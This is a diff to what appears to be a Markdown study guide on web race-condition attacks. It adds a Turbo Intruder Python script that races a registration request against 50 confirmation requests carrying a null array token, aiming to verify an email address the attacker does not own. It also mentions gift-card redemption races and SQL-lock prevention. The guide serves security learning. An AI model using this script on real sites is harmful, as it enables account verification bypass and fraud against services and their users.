@@ -70,6 +70,39 @@
     - Start the attack by clicking Attack.
         - If successful, the gift card is redeemed multiple times, increasing your balance.
 
+- **Exploitation Script that verify the email once created with null token value**
+```python
+def queueRequests(target, wordlists):
+
+    engine = RequestEngine(endpoint=target.endpoint,
+                            concurrentConnections=1,
+                            engine=Engine.BURP2
+                            )
+    
+    confirmationReq = '''POST /confirm?token[]= HTTP/2
+Host: YOUR-HOST
+Cookie: phpsessionid=YOUR-SESSION-TOKEN
+Content-Length: 0
+
+'''
+    for attempt in range(20):
+        currentAttempt = str(attempt)
+        username = 'User' + currentAttempt
+    
+        # queue a single registration request
+        engine.queue(target.req, username, gate=currentAttempt)
+        
+        # queue 50 confirmation requests - note that this will probably sent in two separate packets
+        for i in range(50):
+            engine.queue(confirmationReq, gate=currentAttempt)
+        
+        # send all the queued requests for this attempt
+        engine.openGate(currentAttempt)
+
+def handleResponse(req, interesting):
+    table.add(req)
+    
+```
 
 - **Send in parallel prerequisites (Burp Repeater)**
 > [!NOTE]
@@ -79,7 +112,7 @@
 >   - HTTP/1 keep-alive must not be enabled for the project.
 
 > [!TIP]
-> Email address confirmations, or any email-based operations, are generally a good target for single-endpoint race conditions.
+> Email address confirmations, or any email-based operations (Update eMail), are generally a good target for single-endpoint race conditions.
 
 ## Prevention
 - Use SQL WRITE locks to prevent simultaneous database access:
